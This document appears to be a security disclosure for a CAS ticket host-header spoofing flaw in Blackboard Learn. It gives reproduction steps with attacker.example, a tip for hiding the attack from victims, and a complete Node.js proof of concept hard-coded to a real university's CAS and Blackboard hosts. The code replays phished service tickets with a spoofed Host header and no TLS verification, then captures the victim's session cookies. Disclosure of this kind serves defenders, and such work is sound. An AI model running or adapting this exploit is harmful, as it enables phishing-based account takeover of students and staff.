# Blackboard Learn CAS Ticket Host Header Spoofing 

An authentication module within Blackboard Learn is susceptible to HTTP host
header spoofing during Central Authentication Service (CAS) *service ticket*
validation. A CAS service ticket is intended for only a specific *service*, but
Blackboard Learn does not properly verify that this service is the current
instance. This allows a phishing attack where users believe they are entering
their single-signon details for a certain website, when that malicious website
instead uses the *service ticket* to athenticate as that user to a Blackboard
Learn instance.

## Requirements

  - The Blackboard Learn instance must be configured to authenticate with CAS.
  - A malicious website must be setup to authenticate with that same CAS server.

## Steps to Reproduce

An attacker would setup `attacker.example` in order to athenticate as another
user to a Blackboard Learn instance at `blackboard.example`, which validates
service tickets through `cas.example`.

The following events happen when a user vists `attacker.example`.

  1. The user will be redirected to their institutions CAS login page at:
     `https://cas.example/cas/login?service=https%3A%2F%2Fattacker.example%2Fwebapps%2Fbb-auth-provider-cas-BB5849b9bae4172%2Fexecute%2FcasLogin%3Fcmd%3Dlogin%26authProviderId%3D_102_1%26redirectUrl%3Dhttps%253A%252F%252Fblackboard.example%252Fwebapps%252Fportal%252Fexecute%252FdefaultTab%26globalLogoutEnabled%3Dtrue&renew=true`
  2. The user now sees a login page at `cas.example`. They will most likely
     trust it since this is their institution's standard login screen on a
     trusted domain. The login page will say they are authenticating to
     `attacker.example`.
  3. Upon login, the user will be redirected to back to `attacker.example`: `https://attacker.example/webapps/bb-auth-provider-cas-BB5849b9bae4172/execute/casLogin?cmd=login&authProviderId=_102_1&redirectUrl=https%3A%2F%2Fblackboard.example%2Fwebapps%2Fportal%2Fexecute%2FdefaultTab&globalLogoutEnabled=true&ticket=ST-94783-BFdVJYDvsbi2HR0gXvy6-cas.example`
  4. On its backend, `attacker.example` will now perform an HTTP GET request
     against `blackboard.example` using the service ticket
     `ST-94783-BFdVJYDvsbi2HR0gXvy6-cas.example` retrieved in the last step. The
     GET request will access `blackboard.example` with a host header of:
     `attacker.example`: `https://attacker.example//webapps/bb-auth-provider-cas-BB5849b9bae4172/execute/casLogin?cmd=login&authProviderId=_102_1&redirectUrl=https%3A%2F%2Fblackboard.example%2Fwebapps%2Fportal%2Fexecute%2FdefaultTab&globalLogoutEnabled=true&ticket=ST-94783-BFdVJYDvsbi2HR0gXvy6-cas.example`
  5. `blackboard.example` will respond to the `attacker.example` backend with
     cookies authenticating the target user to the Blackboard Learn instance.

If `attacker.example` is a website individuals at an institution regularly trust
(ex: the institution homepage), that website being compromised would mean the
institution's Blackboard Learn instance is also reasonable compromised with
this vulnerability.

To prevent suspicion, `attacker.example` could redirect the user back to the
`sso.example` login page after step 5 and perform the expected duties
`attacker.example` was meant for from there. The user would see that they have
to hit "log in" twice, but the redirection happens quickly enough the user
couldn't be sure they left the login page and came back.

## Relationship to CVE-2017-18262

It should be noted that CVE-2017-18262 is distinct from this vulnerability.
CVE-2017-18262 is a vulnerability in `redirectTo` validation. This vulnerability
involves a flaw in the `service` URL param sent to the validating login
endpoint.

Using CVE-2017-18262 to phish credentials requires setting up a phishing login
that would mimicks the appearance of `cas.example`. This vulnerability happens
directly on `cas.example`, but requires the user to initially visit
`attacker.example`.

## Testing

This was tested against `lms.uconn.edu` with `brc15007` as the spoofed user.
`lms.uconn.edu` is a Blackboard Learn instance managed by Blackboard Inc. hosted
on Amazon Web Services.

## POC

index.js
```javascript
const crypto = require('crypto')
const Koa = require('koa')
const session = require('koa-session')
const FakeCas = require('./lib/fake-cas')
// The koa-basic-auth module is used purely to protect this POC from being used
// by unauthorized test users.
const auth = require('koa-basic-auth')

const CAS_SERVER = 'https://login.uconn.edu'
const BLACKBOARD_INSTANCE = 'https://lms.uconn.edu'
const VULNERABLE_ENDPOINT = `/webapps/bb-auth-provider-cas-BB5849b9bae4172/execute/casLogin?cmd=login&authProviderId=_102_1&redirectUrl=${encodeURIComponent(BLACKBOARD_INSTANCE)}%2Fwebapps%2Fportal%2Fexecute%2FdefaultTab&globalLogoutEnabled=true`

const POC_APP_USERNAME = 'i-accept-that-my-login-will-be-spoofed-for-testing'
const POC_APP_PASSWORD = 'fH71FnffjycEtMLdqd2zCAwavDzW8HdCaayHrQ4E'

const app = new Koa()

app.keys = [crypto.randomBytes(256)]
app.use(session(app))

app.use(auth({ name: POC_APP_USERNAME, pass: POC_APP_PASSWORD }))

const cas = FakeCas({
  service: ctx => `https://${ctx.host}${VULNERABLE_ENDPOINT}`,
  server: CAS_SERVER
})

app.use(cas.fakeCredentialRequestor({
  attackUrl: ticket =>
    BLACKBOARD_INSTANCE +
    VULNERABLE_ENDPOINT +
    '&ticket=' + ticket
}))

app.use(async ctx => {
  ctx.body = `If I was a bad person, I would use the following cookies to login as you into ${BLACKBOARD_INSTANCE}.\n\n` +
    ctx.session.cookieString
  ctx.session = null
})

app.listen(3000)
```

lib/fake-cas.js
```javascript
const https = require('https')
const fetch = require('isomorphic-fetch')

function createCASMiddleware (options = {}) {
  const server = options.server
  const service = options.service
  const loginUrl = options.login || '/cas/login'

  function fakeCredentialRequestor ({ attackUrl }) {
    return async (ctx, next) => {
      if (!ctx.session.cookieString && !ctx.request.query.ticket) {
        const returnUrl = encodeURIComponent(service(ctx))
        ctx.redirect(
          server + loginUrl +
          '?service=' + returnUrl +
          '&renew=true')
        return
      }

      if (ctx.request.query.ticket) {
        const attack = attackUrl(ctx.request.query.ticket)
        const res = await fetch(attack, {
          headers: { 'host': ctx.request.host },
          // rejectUnauthorized is required since we're spoofing the host
          // header and ctx.request.host liekly won't be in the endpoint's HTTPS
          // certificate.
          agent: new https.Agent({ rejectUnauthorized: false })
        })

        const cookieString = res.headers._headers['set-cookie']
          .map(cookie => cookie.match(/^(.*?);/)[1])
          .map(cookie => `document.cookie = '${cookie}'`)
          .join('\n')

        ctx.session.cookieString = cookieString
        console.log(cookieString)

        ctx.status = 308
        ctx.redirect('/')
        return
      }

      await next()
    }
  }

  return { fakeCredentialRequestor }
}

module.exports = createCASMiddleware
```

package.json
```json
{
  "private": true,
  "main": "index.js",
  "scripts": {
    "dev": "nodemon index"
  },
  "devDependencies": {
    "nodemon": "^1.17.5",
    "standard": "^11.0.1"
  },
  "dependencies": {
    "isomorphic-fetch": "^2.2.1",
    "koa": "^2.5.1",
    "koa-basic-auth": "^3.0.0",
    "koa-session": "^5.8.1",
    "query-string": "^5.0.1",
    "xml2js": "^0.4.19"
  }
}
```
